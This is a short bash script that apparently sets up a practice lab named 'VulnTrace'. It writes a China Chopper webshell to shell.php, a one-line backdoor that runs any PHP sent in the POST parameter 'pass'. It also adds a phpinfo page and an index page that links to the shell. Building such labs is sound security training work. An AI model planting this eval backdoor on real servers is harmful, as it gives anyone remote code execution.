#!/bin/bash

# 开启 Apache 的 rewrite 模块
a2enmod rewrite

# 创建 shell.php（中国菜刀 Webshell 接入点）
cat <<EOF > /var/www/html/shell.php
<?php echo '<h3>🔐 china_chopper Webshell 接入点</h3><p>请使用中国菜刀客户端连接本页面：POST 参数名为 <code>pass</code></p>'; @eval(\$_POST['pass']); ?>
EOF

# 创建 phpinfo.php
echo "<?php phpinfo(); ?>" > /var/www/html/phpinfo.php

# 创建 index.php（入口页）
cat <<EOF > /var/www/html/index.php
<?php echo '<h2>🧪 VulnTrace - china_chopper WebShell 实验环境</h2><ul><li><a href="shell.php">🔐 一句话木马入口 (shell.php)</a></li><li><a href="phpinfo.php">📘 PHP 环境信息 (phpinfo.php)</a></li></ul><p>请通过 <strong>POST</strong> 参数 <code>pass</code> 使用菜刀连接 shell.php</p>'; ?>
EOF

# 链接日志到 stdout/stderr
ln -sf /dev/stdout /var/log/apache2/access.log
ln -sf /dev/stderr /var/log/apache2/error.log
